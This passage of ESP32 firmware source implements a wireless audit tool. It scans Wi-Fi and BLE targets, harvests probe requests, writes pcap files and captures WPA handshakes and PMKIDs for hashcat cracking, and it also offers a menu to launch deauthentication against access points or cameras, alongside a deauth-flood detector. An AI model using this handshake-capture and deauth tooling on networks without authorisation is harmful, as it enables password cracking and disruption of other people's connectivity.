  const std::string apVendor = macVendor(w.bssid);
  targetLines.push_back("Time: " + timeStamp());
  targetLines.push_back(w.bssid + "  CH" + std::to_string(w.channel) + "  " + w.auth);
  if (!apVendor.empty()) targetLines.push_back("Vendor: " + apVendor);
  targetLines.push_back("RSSI avg " + std::to_string(avg) + " (" + std::to_string(lo) + "/" + std::to_string(hi) +
                        ")  " + std::to_string(samples) + " frames");
  targetLines.push_back("Beacons " + std::to_string(g_targetCap.beaconCount) + "  Data " +
                        std::to_string(g_targetCap.dataFrames) + "  Mgmt " + std::to_string(g_targetCap.mgmtFrames));
  targetLines.push_back(std::string("Privacy ") + (g_targetCap.privacy ? "Y" : "N") + "  PMF " +
                        (g_targetCap.pmf ? "Y" : "N") + "  WPS " + (g_targetCap.wps ? "Y" : "N"));
  if (bssid[0] & 0x02) targetLines.push_back("Randomized BSSID");
  const int attackFrames = g_targetCap.deauthFrames + g_targetCap.disassocFrames;
  if (attackFrames > 0)
    targetLines.push_back("Deauth " + std::to_string(g_targetCap.deauthFrames) + "  Disassoc " +
                          std::to_string(g_targetCap.disassocFrames));
  targetLines.push_back("Clients: " + std::to_string(g_targetCap.clientCount));
  for (uint8_t i = 0; i < g_targetCap.clientCount; i++) {
    const std::string clientMac = macToString(g_targetCap.clients[i]);
    const std::string vendor = macVendor(clientMac);
    targetLines.push_back("  " + clientMac + (vendor.empty() ? "" : ("  " + vendor)));
  }

  // Raise deduplicated audit findings for this AP.
  auto pushFinding = [this, index](const char* severity, const std::string& title, const std::string& detail) {
    for (const auto& f : auditFindings)
      if (f.title == title && f.detail == detail) return;
    AuditFinding f;
    f.severity = severity;
    f.title = title;
    f.detail = detail;
    f.wifiIndex = index;
    auditFindings.push_back(std::move(f));
  };
  const std::string who = w.ssid.empty() ? w.bssid : w.ssid;
  if (g_targetCap.wps) pushFinding("MED", "WPS enabled", who + " exposes WPS (PIN brute-force risk).");
  if (g_targetCap.privacy && !g_targetCap.pmf)
    pushFinding("LOW", "No PMF", who + " lacks 802.11w management frame protection.");
  if (g_targetCap.clientCount > 0)
    pushFinding("INFO", "Active clients",
                who + " has " + std::to_string(g_targetCap.clientCount) + " associated client(s).");
  if (attackFrames >= 5)
    pushFinding("HIGH", "Possible deauth activity",
                who + " saw " + std::to_string(attackFrames) + " deauth/disassoc frames (possible attack/evil twin).");

  // Return the radio to the idle (off) state the activity expects.
  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(150);

  targetLocatable = true;
  targetLocBle = false;
  memcpy(targetLocBssid, bssid, 6);
  targetLocChannel = w.channel;
  targetLocName = targetTitle;

  status = std::string("Deep AP done, ") + std::to_string(g_targetCap.clientCount) + " clients";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::deepScanBleTarget(int index) {
  if (index < 0 || index >= static_cast<int>(bleFindings.size())) return;
  targetTitle = std::string("BLE ") +
                (bleFindings[index].name.empty() ? bleFindings[index].address : bleFindings[index].name);
  targetLines.clear();
  targetScroll = 0;
  targetFromList = true;

#if defined(RADIO_AUDIT_ENABLE_BLE)
  const std::string address = bleFindings[index].address;

  status = "Deep scanning device...";
  requestUpdateAndWait();

  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(200);  // let WiFi fully release before the BLE controller starts (C3 is memory-tight)

  if (!bleReady) {
    BLEDevice::init("RadioInk");
    bleScan = BLEDevice::getScan();
    bleReady = true;
  }
  if (!bleScan) {  // controller init failed - bail gracefully instead of crashing
    targetLines.push_back("BLE init failed - try again");
    status = "BLE init failed";
    showingTarget = true;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }
  // Passive scan + proven timing, matching the main scan path. Active scanning
  // here was triggering an out-of-memory abort() on the ESP32-C3.
  bleScan->setActiveScan(false);
  bleScan->setInterval(320);
  bleScan->setWindow(80);

  int rssiMin = 0, rssiMax = 0, samples = 0;
  long rssiSum = 0;
  std::string name, manufacturer, services, serviceDataUuid, serviceDataHex;
  bool hasTxPower = false;
  int txPower = 0;
  int addressType = -1;

  for (int pass = 0; pass < 3; pass++) {
    BLEScanResults* results = bleScan->start(2, false);
    const int count = results ? results->getCount() : 0;
    for (int i = 0; i < count; i++) {
      BLEAdvertisedDevice device = results->getDevice(i);
      if (std::string(device.getAddress().toString().c_str()) != address) continue;
      const int r = device.getRSSI();
      rssiSum += r;
      if (samples == 0) {
        rssiMin = r;
        rssiMax = r;
      } else {
        rssiMin = std::min(rssiMin, r);
        rssiMax = std::max(rssiMax, r);
      }
      samples++;
      if (name.empty() && device.haveName()) name = device.getName().c_str();
      if (manufacturer.empty() && device.haveManufacturerData())
        manufacturer = hexEncode(device.getManufacturerData()).c_str();
      if (services.empty() && device.haveServiceUUID()) services = device.getServiceUUID().toString().c_str();
      if (serviceDataHex.empty() && device.haveServiceData()) {
        serviceDataUuid = device.getServiceDataUUID().toString().c_str();
        serviceDataHex = hexEncode(device.getServiceData()).c_str();
      }
      if (device.haveTXPower()) {
        hasTxPower = true;
        txPower = device.getTXPower();
      }
      addressType = device.getAddressType();
    }
    bleScan->clearResults();
  }
  shutdownBleController();

  if (name.empty()) name = bleFindings[index].name;
  if (manufacturer.empty()) manufacturer = bleFindings[index].manufacturerHex;
  if (serviceDataUuid.empty()) serviceDataUuid = bleFindings[index].serviceDataUuid;
  if (serviceDataHex.empty()) serviceDataHex = bleFindings[index].serviceDataHex;
  const int avg = samples ? static_cast<int>(rssiSum / static_cast<long>(samples)) : bleFindings[index].rssi;
  const int lo = samples ? rssiMin : avg;
  const int hi = samples ? rssiMax : avg;
  const bool randomAddress = (addressType == 1 || addressType == 3);
  const std::string advType = decodeBleAdvert(manufacturer, serviceDataUuid, serviceDataHex);

  targetLines.push_back("Time: " + timeStamp());
  targetLines.push_back(address);
  targetLines.push_back("Name: " + (name.empty() ? std::string("<unnamed>") : name));
  if (!advType.empty()) targetLines.push_back("Type: " + advType);
  targetLines.push_back("Vendor: " + bleCompany(manufacturer));
  if (!randomAddress) {
    const std::string macVend = macVendor(address);
    if (!macVend.empty() && macVend != "randomized") targetLines.push_back("MAC vendor: " + macVend);
  }
  targetLines.push_back("RSSI avg " + std::to_string(avg) + " (" + std::to_string(lo) + "/" + std::to_string(hi) +
                        ")  seen " + std::to_string(samples) + "/3");
  if (hasTxPower) targetLines.push_back("TX power: " + std::to_string(txPower));
  if (!services.empty()) targetLines.push_back("Service: " + services);
  if (!manufacturer.empty()) targetLines.push_back("Mfr data: " + manufacturer);
  targetLines.push_back(std::string("Random address: ") + (randomAddress ? "Y" : "N"));

  targetLocatable = true;
  targetLocBle = true;
  targetLocAddr = address;
  targetLocName = targetTitle;

  status = "Deep device done";
#else
  targetLines.push_back("BLE support is disabled in this build.");
  status = "BLE disabled";
#endif

  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::startProbeScan() {
  targetTitle = "Probe Requests";
  targetLines.clear();
  probeFindings.clear();
  targetScroll = 0;
  targetFromList = false;  // launched from the main menu, returns there
  targetLocatable = false;

  status = "Harvesting probes...";
  requestUpdateAndWait();

  prepWifiSta();

  g_probeCap = makeUniqueNoThrow<ProbeCapture>();
  if (!g_probeCap) {
    LOG_ERR("RADIO", "probe: OOM");
    status = "Probe scan: out of memory";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&probePromiscuousCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);

  g_probeCap->active = true;
  for (int channel = 1; channel <= 13; channel++) {
    esp_wifi_set_channel(static_cast<uint8_t>(channel), WIFI_SECOND_CHAN_NONE);
    delay(600);
  }
  g_probeCap->active = false;
  esp_wifi_set_promiscuous(false);

  const int count = g_probeCap->count;
  probeFindings.reserve(count);
  for (int i = 0; i < count; i++) {
    const auto& row = g_probeCap->rows[i];
    ProbeEntry entry;
    entry.client = macToString(row.mac);
    entry.ssid = row.ssid;
    entry.rssi = row.rssi;
    probeFindings.push_back(std::move(entry));
  }
  g_probeCap.reset();  // free the probe table back to the heap
  std::sort(probeFindings.begin(), probeFindings.end(),
            [](const ProbeEntry& a, const ProbeEntry& b) { return a.rssi > b.rssi; });

  targetLines.push_back("Time: " + timeStamp());
  targetLines.push_back("Clients probing: " + std::to_string(probeFindings.size()));
  for (const auto& probe : probeFindings) {
    const std::string vendor = macVendor(probe.client);
    targetLines.push_back(probe.client + (vendor.empty() ? "" : ("/" + vendor)) + "  " + probeSsidLabel(probe.ssid) +
                          "  " + std::to_string(probe.rssi) + " dBm");
  }

  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(150);

  scanTime = timeStamp();
  auditFindings.erase(std::remove_if(auditFindings.begin(), auditFindings.end(),
                                     [](const AuditFinding& finding) {
                                       return finding.title == "Probe requests observed" ||
                                              finding.title == "Directed probe requests";
                                     }),
                      auditFindings.end());
  if (!probeFindings.empty()) {
    addAuditFinding("INFO", "Probe requests observed",
                    std::to_string(probeFindings.size()) + " client probe request(s) captured in Client Recon.");
    int directedCount = 0;
    for (const auto& probe : probeFindings)
      if (!probe.ssid.empty()) directedCount++;
    if (directedCount > 0) {
      addAuditFinding("LOW", "Directed probe requests",
                      std::to_string(directedCount) +
                          " probe request(s) named a specific SSID, which can disclose client network history.");
    }
  }
  status = std::string("Probe scan done, ") + std::to_string(probeFindings.size()) + " seen";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::startPcapCapture() {
  captureMode = CaptureMode::Pcap;
  // Prepare the SD output file first: a capture with nowhere to land is useless.
  Storage.ensureDirectoryExists(CAPTURE_DIR);
  capturePath = std::string(CAPTURE_DIR) + "/cap-" + std::to_string(millis() / 1000) + ".pcap";
  if (!Storage.openFileForWrite("RADIO", capturePath, captureFile)) {
    LOG_ERR("RADIO", "PCAP: cannot open %s", capturePath.c_str());
    status = "Capture: SD open failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  // libpcap global header (little-endian, classic format).
  uint8_t globalHeader[24];
  const uint32_t magic = 0xA1B2C3D4;
  const uint16_t versionMajor = 2;
  const uint16_t versionMinor = 4;
  const int32_t thisZone = 0;
  const uint32_t sigFigs = 0;
  const uint32_t snapLen = PCAP_SNAPLEN;
  const uint32_t network = PCAP_LINKTYPE;
  memcpy(globalHeader + 0, &magic, 4);
  memcpy(globalHeader + 4, &versionMajor, 2);
  memcpy(globalHeader + 6, &versionMinor, 2);
  memcpy(globalHeader + 8, &thisZone, 4);
  memcpy(globalHeader + 12, &sigFigs, 4);
  memcpy(globalHeader + 16, &snapLen, 4);
  memcpy(globalHeader + 20, &network, 4);
  captureFile.write(globalHeader, sizeof(globalHeader));
  captureFile.flush();

  // Bring up promiscuous mode capturing all frame types on channel 1; the loop
  // hops channels as it drains.
  status = "Capturing...";
  requestUpdateAndWait();
  prepWifiSta();

  g_pcapBuf = makeUniqueNoThrow<uint8_t[]>(PCAP_RING_SIZE);
  if (!g_pcapBuf) {
    LOG_ERR("RADIO", "PCAP: OOM ring %u bytes", static_cast<unsigned>(PCAP_RING_SIZE));
    status = "Capture: out of memory";
    state = State::ERROR;
    captureFile.close();
    requestUpdate();
    return;
  }
  memset(&g_pcap, 0, sizeof(g_pcap));
  g_pcap.buf = g_pcapBuf.get();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&pcapPromiscuousCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_pcap.active = true;
  capturing = true;
  captureChannelLocked = false;
  captureBytesWritten = sizeof(globalHeader);
  captureLastHopMs = millis();
  captureLastFlushMs = millis();
  state = State::CAPTURING;
  requestUpdate();
}

void RadioAuditActivity::stopPcapCapture() {
  if (!capturing) return;
  g_pcap.active = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  captureBytesWritten += pcapDrain(captureFile);  // flush whatever is left in the ring
  captureFile.flush();
  captureFile.close();
  capturing = false;
  g_pcap.buf = nullptr;
  g_pcapBuf.reset();  // return the 32 KB ring to the heap

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);

  scanTime = timeStamp();
  state = State::SAVED;
  status = std::string("Saved ") + std::to_string(g_pcap.packets) + " pkts (" + std::to_string(g_pcap.drops) +
           " dropped)";

  // Show a result page (mirrors the probe-scan summary view).
  targetTitle = "PCAP capture saved";
  targetLines.clear();
  targetLines.push_back("File: " + capturePath);
  targetLines.push_back("Packets: " + std::to_string(g_pcap.packets));
  targetLines.push_back("Dropped: " + std::to_string(g_pcap.drops));
  targetLines.push_back("Bytes: " + std::to_string(captureBytesWritten));
  targetLines.push_back("Time: " + scanTime);
  targetLines.push_back("Open the .pcap in Wireshark.");
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderCapture() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "PCAP Capture",
                 status.c_str());

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("Packets: ") + g_pcap.packets + "   Dropped: " + g_pcap.drops).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(UI_12_FONT_ID, summaryX, y, (String("Channel: ") + captureChannel + "  (hopping 1-13)").c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("Written: ") + captureBytesWritten + " bytes").c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    renderer.truncatedText(SMALL_FONT_ID, capturePath.c_str(), pageWidth - summaryX * 2).c_str());

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::startHandshakeCapture() {
  captureMode = CaptureMode::Handshake;
  Storage.ensureDirectoryExists(HS_DIR);
  capturePath = std::string(HS_DIR) + "/hs-" + std::to_string(millis() / 1000) + "." + "22000";
  if (!Storage.openFileForWrite("RADIO", capturePath, captureFile)) {
    LOG_ERR("RADIO", "HS: cannot open %s", capturePath.c_str());
    status = "Handshake: SD open failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  g_hs = makeUniqueNoThrow<HandshakeCapture>();  // zero-initialized on the heap
  if (!g_hs) {
    LOG_ERR("RADIO", "HS: OOM slot table");
    status = "Handshake: out of memory";
    state = State::ERROR;
    captureFile.close();
    requestUpdate();
    return;
  }

  status = "Capturing handshakes...";
  requestUpdateAndWait();
  prepWifiSta();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&handshakePromiscuousCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_hs->active = true;
  capturing = true;
  captureChannelLocked = false;
  hsPmkidCount = 0;
  hsEapolCount = 0;
  captureLastHopMs = millis();
  captureLastFlushMs = millis();
  state = State::CAPTURING;
  requestUpdate();
}

void RadioAuditActivity::processHandshakes() {
  // Write any newly-completed PMKID/EAPOL lines once we also know the ESSID.
  for (auto& s : g_hs->slots) {
    if (!s.used) continue;
    const HsSsidEntry* se = hsFindSsid(s.ap);
    if (!se || !se->ssid[0]) continue;  // hold until a beacon supplies the ESSID

    if (s.havePmkid && !s.pmkidWritten) {
      hsWritePmkidLine(captureFile, s, se->ssid);
      s.pmkidWritten = true;
      hsPmkidCount++;
    }
    if (s.haveM1 && s.haveM2 && !s.eapolWritten && memcmp(s.replayM1, s.replayM2, 8) == 0) {
      hsWriteEapolLine(captureFile, s, se->ssid);
      s.eapolWritten = true;
      hsEapolCount++;
    }
  }
}

void RadioAuditActivity::stopHandshakeCapture() {
  if (!capturing) return;
  g_hs->active = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  processHandshakes();  // final pass for anything completed just before stop
  captureFile.flush();
  captureFile.close();
  capturing = false;
  g_hs.reset();  // free the slot table back to the heap

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);

  scanTime = timeStamp();
  state = State::SAVED;
  status = std::string("Saved ") + std::to_string(hsPmkidCount) + " PMKID / " + std::to_string(hsEapolCount) + " EAPOL";

  targetTitle = "Handshake capture saved";
  targetLines.clear();
  targetLines.push_back("File: " + capturePath);
  targetLines.push_back("PMKID lines: " + std::to_string(hsPmkidCount));
  targetLines.push_back("EAPOL (M1+M2): " + std::to_string(hsEapolCount));
  targetLines.push_back("Time: " + scanTime);
  targetLines.push_back("Crack with: hashcat -m 22000");
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderHandshake() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Handshake / PMKID",
                 status.c_str());

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("PMKID: ") + hsPmkidCount + "   EAPOL: " + hsEapolCount).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(UI_12_FONT_ID, summaryX, y, (String("Channel: ") + captureChannel + "  (hopping 1-13)").c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("Beacons seen: ") + g_hs->beaconCount).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
  HsSsidEntry* tgt = hsBestAp();
  const std::string tgtLine =
      tgt ? (std::string("Deauth target: ") + tgt->ssid + " CH" + std::to_string(tgt->channel))
          : std::string("Deauth target: (waiting for beacon)");
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    renderer.truncatedText(SMALL_FONT_ID, tgtLine.c_str(), pageWidth - summaryX * 2).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  const char* confirmLabel = "Deauth";
#else
  renderer.drawText(SMALL_FONT_ID, summaryX, y, "Passive: associate a client to force a handshake.");
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  const char* confirmLabel = "Stop";
#endif
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    renderer.truncatedText(SMALL_FONT_ID, capturePath.c_str(), pageWidth - summaryX * 2).c_str());

  const auto labels = mappedInput.mapLabels("Stop", confirmLabel, "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::startDeauthDetect() {
  captureMode = CaptureMode::DeauthDetect;
  Storage.ensureDirectoryExists(HS_DIR);
  capturePath = std::string(HS_DIR) + "/deauth-" + std::to_string(millis() / 1000) + ".txt";
  if (!Storage.openFileForWrite("RADIO", capturePath, captureFile)) {
    LOG_ERR("RADIO", "DD: cannot open %s", capturePath.c_str());
    status = "Deauth detect: SD open failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  g_dd = makeUniqueNoThrow<DeauthDetect>();  // zero-initialized on the heap
  if (!g_dd) {
    LOG_ERR("RADIO", "DD: OOM slot table");
    status = "Deauth detect: out of memory";
    state = State::ERROR;
    captureFile.close();
    requestUpdate();
    return;
  }

  const std::string hdr =
      "# Radio Ink deauth/disassoc flood detector\n# src,bssid,deauth,disassoc,channel,rssi\n";
  captureFile.write(reinterpret_cast<const uint8_t*>(hdr.data()), hdr.size());

  status = "Watching for deauth floods...";
  requestUpdateAndWait();
  prepWifiSta();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&deauthDetectCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_dd->active = true;
  capturing = true;
  captureChannelLocked = false;
  ddAlertCount = 0;
  captureLastHopMs = millis();
  captureLastFlushMs = millis();
  state = State::CAPTURING;
  requestUpdate();
}

void RadioAuditActivity::processDeauthDetect() {
  // Write an alert line the first time a source crosses the flood threshold.
  for (auto& s : g_dd->slots) {
    if (!s.used || s.reported) continue;
    const uint16_t total = static_cast<uint16_t>(s.deauthCount + s.disassocCount);
    if (total < DD_ALERT_THRESHOLD) continue;
    const std::string line = macToString(s.src) + "," + macToString(s.bssid) + "," +
                             std::to_string(s.deauthCount) + "," + std::to_string(s.disassocCount) + "," +
                             std::to_string(s.lastChannel) + "," + std::to_string(s.lastRssi) + "\n";
    captureFile.write(reinterpret_cast<const uint8_t*>(line.data()), line.size());
    s.reported = true;
    ddAlertCount++;
  }
}

void RadioAuditActivity::stopDeauthDetect() {
  if (!capturing) return;
  g_dd->active = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  processDeauthDetect();  // final pass for anything that just crossed the threshold
  captureFile.flush();
  captureFile.close();

  // Snapshot the summary before freeing the slot table.
  const uint32_t totalFrames = g_dd->totalFrames;
  targetTitle = "Deauth detector stopped";
  targetLines.clear();
  targetLines.push_back("Frames seen: " + std::to_string(totalFrames));
  targetLines.push_back("Flagged sources: " + std::to_string(ddAlertCount));
  int listed = 0;
  for (const auto& s : g_dd->slots) {
    if (!s.used) continue;
    const uint16_t total = static_cast<uint16_t>(s.deauthCount + s.disassocCount);
    if (total == 0) continue;
    if (listed++ >= 8) break;
    targetLines.push_back((s.reported ? "[FLOOD] " : "") + macToString(s.src) + " x" + std::to_string(total) +
                          " CH" + std::to_string(s.lastChannel) + " " + std::to_string(s.lastRssi) + "dBm");
  }
  if (listed == 0) targetLines.push_back("No deauth/disassoc frames seen.");
  targetLines.push_back("Log: " + capturePath);

  capturing = false;
  g_dd.reset();  // free the slot table back to the heap

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);

  scanTime = timeStamp();
  state = State::SAVED;
  status = std::string("Flagged ") + std::to_string(ddAlertCount) + " source(s)";
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderDeauthDetect() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Deauth Detector",
                 status.c_str());

  // Live tally from the detector slots (callback updates these concurrently).
  uint32_t totalFrames = 0;
  int activeSources = 0;
  const DeauthSrc* worst = nullptr;
  if (g_dd) {
    totalFrames = g_dd->totalFrames;
    for (const auto& s : g_dd->slots) {
      if (!s.used) continue;
      const uint16_t total = static_cast<uint16_t>(s.deauthCount + s.disassocCount);
      if (total == 0) continue;
      activeSources++;
      if (!worst || total > static_cast<uint16_t>(worst->deauthCount + worst->disassocCount)) worst = &s;
    }
  }

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("Frames: ") + totalFrames + "   Flagged: " + ddAlertCount).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("Channel: ") + captureChannel + "  Sources: " + activeSources).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  if (worst) {
    const uint16_t total = static_cast<uint16_t>(worst->deauthCount + worst->disassocCount);
    const String top = String("Top: ") + macToString(worst->src).c_str() + " x" + total;
    renderer.drawText(SMALL_FONT_ID, summaryX, y,
                      renderer.truncatedText(SMALL_FONT_ID, top.c_str(), pageWidth - summaryX * 2).c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  }
  renderer.drawText(SMALL_FONT_ID, summaryX, y, "Sustained bursts = deauth attack.");

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::openTargetMenu() {
  targetMenuCodes.clear();
  if (targetIsCamera) {
    if (targetLocatable) targetMenuCodes.push_back(2);  // locate
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
    if (!targetLocBle) targetMenuCodes.push_back(5);  // deauth (client = directed, AP = broadcast)
#endif
    targetMenuCodes.push_back(3);  // close
    targetMenuSel = 0;
    targetMenuOpen = true;
    requestUpdate();
    return;
  }
  if (targetLocBle) {
#if defined(RADIO_AUDIT_ENABLE_BLE)
    targetMenuCodes.push_back(4);  // GATT enumerate
#endif
  } else {
    const bool wifiAp =
        lastDeepScanWifiIndex >= 0 && lastDeepScanWifiIndex < static_cast<int>(wifiFindings.size());
    if (wifiAp) {
      targetMenuCodes.push_back(0);  // mark / unmark for deauth
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      targetMenuCodes.push_back(1);  // deauth this AP now
#endif
    }
  }
  if (targetLocatable) targetMenuCodes.push_back(2);  // locate (find it)
  targetMenuCodes.push_back(3);                       // close
  targetMenuSel = 0;
  targetMenuOpen = true;
  requestUpdate();
}

std::string RadioAuditActivity::targetMenuLabel(int code) const {
  switch (code) {
    case 0: {
      const bool marked = lastDeepScanWifiIndex >= 0 && lastDeepScanWifiIndex < static_cast<int>(wifiFindings.size()) &&
                          wifiFindings[lastDeepScanWifiIndex].marked;
      return marked ? "Unmark target" : "Mark for deauth";
    }
    case 1: return "Deauth this AP";
    case 2: return "Locate (find it)";
    case 3: return "Close";
    case 4: return "GATT enumerate";
    case 5: return targetCamHasAp ? "Deauth camera" : "Deauth this AP";
  }
  return "";
}

void RadioAuditActivity::runTargetMenuItem(int code) {
  switch (code) {
    case 0:
      if (lastDeepScanWifiIndex >= 0 && lastDeepScanWifiIndex < static_cast<int>(wifiFindings.size())) {
        bool& marked = wifiFindings[lastDeepScanWifiIndex].marked;
        marked = !marked;
        status = marked ? "Marked for deauth" : "Unmarked";
      }
      requestUpdate();
      return;
    case 1:
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      if (lastDeepScanWifiIndex >= 0 && lastDeepScanWifiIndex < static_cast<int>(wifiFindings.size())) {
        targetMenuOpen = false;
        const auto& w = wifiFindings[lastDeepScanWifiIndex];
        beginDeauth({lastDeepScanWifiIndex}, w.ssid.empty() ? w.bssid : w.ssid);
      }
#endif
      return;
    case 2:
      targetMenuOpen = false;
      startLocator();
      return;
    case 4:
#if defined(RADIO_AUDIT_ENABLE_BLE)
      gattEnumerate();
#endif
      return;
    case 5:
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      targetMenuOpen = false;
      startCameraDeauth();
#endif
      return;
    case 3:
    default:
      targetMenuOpen = false;
      requestUpdate();
      return;
  }
}

void RadioAuditActivity::renderTargetMenu() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, targetTitle.c_str(),
                 "Actions");
  const int n = static_cast<int>(targetMenuCodes.size());
  const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
  GUI.drawList(renderer, Rect{0, contentTop, pageWidth, listHeight}, n, targetMenuSel,
               [this](int index) { return targetMenuLabel(targetMenuCodes[index]); }, nullptr, nullptr);

  const auto labels = mappedInput.mapLabels("Back", "Select", "Up", "Down");
